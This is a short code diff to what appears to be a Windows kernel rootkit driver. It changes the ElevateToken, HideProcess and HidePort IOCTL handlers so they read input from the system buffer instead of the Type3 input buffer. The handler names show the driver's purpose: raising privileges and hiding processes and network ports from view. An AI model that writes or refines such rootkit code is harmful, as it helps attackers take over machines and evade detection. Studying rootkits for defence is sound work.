@@ -7,9 +7,7 @@
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
-	const auto stack = IoGetCurrentIrpStackLocation(Irp);
-
-	auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
+	auto pid = reinterpret_cast<PULONG>(Irp->AssociatedIrp.SystemBuffer);
 
 	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
@@ -28,9 +26,8 @@ NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 
 NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
-	const auto stack = IoGetCurrentIrpStackLocation(Irp);
 
-	const auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
+	const auto pid = reinterpret_cast<PULONG>(Irp->AssociatedIrp.SystemBuffer);
 	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
@@ -45,8 +42,7 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 
 NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
-	const auto stack = IoGetCurrentIrpStackLocation(Irp);
-	auto port = (USHORT*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	auto port = (USHORT*)Irp->AssociatedIrp.SystemBuffer;
 
 	if (*port <= static_cast < USHORT>(0) || *port > static_cast <USHORT>(65535))
 	{
